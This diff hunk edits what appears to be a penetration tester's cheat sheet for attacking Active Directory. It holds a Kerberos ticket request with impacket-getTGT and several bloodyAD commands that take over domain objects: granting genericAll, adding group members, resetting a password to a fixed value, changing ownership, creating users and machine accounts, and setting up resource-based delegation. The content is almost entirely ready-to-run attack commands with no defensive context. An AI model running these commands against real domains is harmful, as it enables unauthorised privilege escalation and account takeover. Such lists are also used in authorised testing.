@@ -469,9 +469,10 @@ https://datafetcher.com/graphql-json-body-converter
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
 
 +---------- Add ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'GROUP' 'USER'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'GROUP' 'USER'
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'GROUP' 'USER'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' 'USER'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'DistinguishedName' 'USER'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add rbcd 'TARGET' 'SERVICE'
